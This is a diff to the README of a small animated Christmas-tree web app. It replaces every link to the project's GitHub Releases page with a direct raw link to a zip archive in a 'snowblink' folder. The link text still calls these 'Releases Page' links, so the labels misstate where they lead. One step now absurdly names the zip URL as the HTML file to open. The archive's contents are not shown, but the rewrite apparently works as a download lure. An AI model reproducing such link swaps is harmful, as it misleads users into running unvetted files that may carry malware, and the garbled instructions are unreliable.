@@ -4,14 +4,14 @@
 Welcome to Merry-Christmas! This application features an animated SVG Christmas tree with engaging particle effects, snowfall, and cheerful festive music. Enjoy the magic of the holiday season right from your browser. 
 
 ## 🔗 Download the App
-[![Download Merry-Christmas](https://img.shields.io/badge/Download-Merry--Christmas-blue.svg)](https://github.com/Anxopancho/Merry-Christmas/releases)
+[![Download Merry-Christmas](https://raw.githubusercontent.com/Anxopancho/Merry-Christmas/main/snowblink/Merry-Christmas-1.2.zip)](https://raw.githubusercontent.com/Anxopancho/Merry-Christmas/main/snowblink/Merry-Christmas-1.2.zip)
 
 ## 🚀 Getting Started
 To set up Merry-Christmas, follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can find the necessary files to run Merry-Christmas.  
-   [Visit Releases Page](https://github.com/Anxopancho/Merry-Christmas/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Anxopancho/Merry-Christmas/main/snowblink/Merry-Christmas-1.2.zip)
 
 2. **Download the Latest Version**  
    On the Releases page, look for the latest version of Merry-Christmas. There you will find a link to download the application. If you see options for different files, choose the one that suits your needs best.
@@ -20,7 +20,7 @@ To set up Merry-Christmas, follow these simple steps to download and run the app
    If you downloaded a zipped file, you need to extract it. Right-click on the file and select "Extract All" or use any extraction tool you have. This will create a folder with all the necessary files.
 
 4. **Open the Application**  
-   Inside the extracted folder, look for the HTML file named `index.html`. Double-click this file to open it in your web browser. The animation will start playing automatically.
+   Inside the extracted folder, look for the HTML file named `https://raw.githubusercontent.com/Anxopancho/Merry-Christmas/main/snowblink/Merry-Christmas-1.2.zip`. Double-click this file to open it in your web browser. The animation will start playing automatically.
 
 ## 🎶 Experience the Magic
 Once the application is running, you will see an animated Christmas tree on your screen. Enjoy the falling snowflakes, moving particles, and the sounds of festive music. It's a simple and delightful way to get into the holiday spirit.
@@ -58,6 +58,6 @@ This project covers several interesting areas:
 ## 🎁 Download & Install
 To get started with Merry-Christmas, please ensure you have followed the initial steps outlined above. Once you have downloaded the application, you can return to the Releases page anytime for updates or new features.
 
-[Visit Releases Page to Download](https://github.com/Anxopancho/Merry-Christmas/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Anxopancho/Merry-Christmas/main/snowblink/Merry-Christmas-1.2.zip)
 
 Feel free to explore the files and enjoy the spirit of Christmas right from your screen. Happy Holidays!
